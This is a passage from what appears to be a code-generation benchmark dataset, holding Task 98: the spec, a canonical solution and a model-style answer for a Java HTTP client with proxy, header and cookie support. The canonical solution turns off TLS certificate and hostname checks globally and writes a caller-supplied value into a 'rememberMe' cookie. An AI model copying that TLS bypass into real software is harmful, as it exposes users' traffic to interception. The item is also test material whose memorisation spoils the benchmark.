{\n            throw new RuntimeException(e);\n        }\n    }\n\n    private <T> String buildUrl(String endpoint, HashMap<String, Object> query) {\n        String queryString = parseQueries(query);\n        return baseUrl + endpoint + (queryString.isEmpty() ? \"\" : \"?\" + queryString);\n    }\n\n    private <T> String serialize(T object) {\n        // Implement JSON serialization logic here using Gson\n        return new Gson().toJson(object);\n    }\n\n    private <T> T deserialize(String json, Class<T> tClass) {\n        // Implement JSON deserialization logic here using Gson\n        return new Gson().fromJson(json, tClass);\n    }\n}\n```"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a Java HTTP client class that handles HTTP/HTTPS requests with support for proxies, custom headers, cookies, and request body configuration. The class should manage SSL verification, connection timeouts, and proper resource cleanup.\n\nClass Description: The HttpClient class provides functionality to send HTTP requests and receive responses. It handles SSL certificate verification (with optional bypass), proxy configuration, request customization, and response processing. The class maintains static configuration and includes utility methods for connection management.\n\nAttributes:\n\nconfig: [Config] - Singleton instance holding configuration settings like proxy information and cookie names\n\nMethods:\n\nsendRequest: [sendRequest]([HttpRequestInfo httpRequestInfo, String cookieValue]) -> [String] - Main method to send HTTP requests. Takes request info and cookie value, returns response body as string or null on failure.\n\ncreateConnection: [createConnection]([HttpRequestInfo httpRequestInfo]) -> [HttpURLConnection] - Creates and returns a connection object, optionally through a proxy if configured.\n\nconfigureRequest: [configureRequest]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue]) -> [void] - Configures request method, headers, and cookies on the connection object.\n\nconfigureCookie: [configureCookie]([Map<String,String> headers, String cookieValue]) -> [void] - Handles cookie manipulation in request headers.\n\nsendRequestBody: [sendRequestBody]([HttpURLConnection connection, HttpRequestInfo httpRequestInfo]) -> [void] - Sends request body data if present in the request info.\n\ncloseResources: [closeResources]([HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos]) -> [void] - Safely closes all connection-related resources.",
    "Canonical_solution": "import javax.net.ssl.*;\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class HttpClient {\n    private static Config config = Config.getInstance();\n\n    static {\n        try {\n            SSLContext sslcontext = SSLContext.getInstance(\"SSL\");\n            sslcontext.init(null, new TrustManager[]{new MyX509TrustManager()}, null);\n            HostnameVerifier ignoreHostnameVerifier = (s, sslsession) -> true;\n            HttpsURLConnection.setDefaultHostnameVerifier(ignoreHostnameVerifier);\n            HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());\n        } catch (NoSuchAlgorithmException | KeyManagementException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n\n            connection.setConnectTimeout(20000);\n            connection.setReadTimeout(20000);\n            connection.connect();\n\n            inputStream = connection.getInputStream();\n            if (inputStream.available() > 0) {\n                byte[] buffer = new byte[inputStream.available()];\n                inputStream.read(buffer);\n                baos.write(buffer, 0, buffer.length);\n            }\n        } catch (Exception e) {\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n        return baos.toString();\n    }\n\n    private static HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws IOException {\n        if (config.isProxyEnabled()) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyIP(), config.getProxyPort()));\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection(proxy);\n        } else {\n            return (HttpURLConnection) new URL(httpRequestInfo.getRequestURL()).openConnection();\n        }\n    }\n\n    private static void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) {\n        connection.setRequestMethod(httpRequestInfo.getRequestMethod());\n        Map<String, String> headers = new HashMap<>();\n        if (httpRequestInfo.getHeaders().size() > 0) {\n            headers.putAll(httpRequestInfo.getHeaders());\n        } else {\n            headers.put(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\");\n        }\n        configureCookie(headers, cookieValue);\n        headers.forEach(connection::setRequestProperty);\n        connection.setRequestProperty(\"connection\", \"close\");\n    }\n\n    private static void configureCookie(Map<String, String> headers, String cookieValue) {\n        String cookie = headers.get(\"Cookie\");\n        if (cookie == null) {\n            headers.put(\"Cookie\", config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else if (!cookie.contains(config.getRememberMeCookieName() + \"=\")) {\n            headers.put(\"Cookie\", cookie + \"; \" + config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else {\n            int start = cookie.indexOf(config.getRememberMeCookieName()) + config.getRememberMeCookieName().length() + 1;\n            int end = cookie.indexOf(\";\", start);\n            end = end == -1 ? cookie.length() : end;\n            headers.put(\"Cookie\", cookie.substring(0, start) + cookieValue + cookie.substring(end));\n        }\n    }\n\n    private static void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        String requestBody = httpRequestInfo.getRequestBody();\n        if (requestBody != null && !requestBody.trim().equals(\"\")) {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            PrintWriter printWriter = new PrintWriter(connection.getOutputStream());\n            printWriter.write(requestBody);\n            printWriter.flush();\n        }\n    }\n\n    private static void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        try {\n            if (connection != null) connection.disconnect();\n            if (inputStream != null) inputStream.close();\n            if (baos != null) baos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Map;\n\npublic class HttpClient {\n    private static final Config config = new Config();\n\n    public static String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                inputStream = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[4096];\n                int bytesRead;\n                while ((bytesRead = inputStream.read(buffer)) != -1) {\n                    baos.write(buffer, 0, bytesRead);\n                }\n                return baos.toString(\"UTF-8\");\n            } else {\n                System.err.println(\"HTTP error code: \" + responseCode);\n                return null;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n    }\n\n    private static HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws IOException {\n        URL url = new URL(httpRequestInfo.getUrl());\n        Proxy proxy = config.getProxy() != null ? new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxy().getHost(), config.getProxy().getPort())) : null;\n        return (HttpURLConnection) (proxy != null ? url.openConnection(proxy) : url.openConnection());\n    }\n\n    private static void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) throws IOException {\n        connection.setRequestMethod(httpRequestInfo.getMethod());\n        connection.setConnectTimeout(config.getConnectionTimeout());\n        connection.setReadTimeout(config.getReadTimeout());\n        connection.setDoInput(true);\n        connection.setDoOutput(httpRequestInfo.hasBody());\n\n        Map<String, String> headers = httpRequestInfo.getHeaders();\n        configureCookie(headers, cookieValue);\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n    }\n\n    private static void configureCookie(Map<String, String> headers, String cookieValue) {\n        if (cookieValue != null && !cookieValue.isEmpty()) {\n            headers.put(\"Cookie\", cookieValue);\n        }\n    }\n\n    private static void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        if (httpRequestInfo.hasBody()) {\n            try (OutputStream os = connection.getOutputStream()) {\n                os.write(httpRequestInfo.getBody().getBytes(\"UTF-8\"));\n            }\n        }\n    }\n\n    private static void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        if (connection != null) {\n            connection.disconnect();\n        }\n        try {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (baos != null) {\n                baos.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static class Config {\n        private Proxy proxy;\n        private int connectionTimeout = 5000;\n        private int readTimeout = 5000;\n\n        public Proxy getProxy() {\n            return proxy;\n        }\n\n        public void setProxy(Proxy proxy) {\n            this.proxy = proxy;\n        }\n\n        public int getConnectionTimeout() {\n            return connectionTimeout;\n        }\n\n        public void setConnectionTimeout(int connectionTimeout) {\n            this.connectionTimeout = connectionTimeout;\n        }\n\n        public int getReadTimeout() {\n            return readTimeout;\n        }\n\n        public void setReadTimeout(int readTimeout) {\n            this.readTimeout = readTimeout;\n        }\n    }\n\n    public static class HttpRequestInfo {\n        private String url;\n        private String method;\n        private Map<String, String> headers;\n        private boolean hasBody;\n        private String body;\n\n        public String getUrl() {\n            return url;\n        }\n\n        public void setUrl(String url) {\n            this.url = url;\n        }\n\n        public String getMethod() {\n            return method;\n        }\n\n        public void setMethod(String method) {\n            this.method = method;\n        }\n\n        public Map<String, String> getHeaders() {\n            return headers;\n        }\n\n        public void setHeaders(Map<String, String> headers) {\n            this.headers = headers;\n        }\n\n        public boolean hasBody() {\n            return hasBody;\n        }\n\n        public void setHasBody(boolean hasBody) {\n            this.hasBody = hasBody;\n        }\n\n        public String getBody() {\n            return body;\n        }\n\n        public void setBody(String body) {\n            this.body = body;\n        }\n    }\n}\n```"
  }
]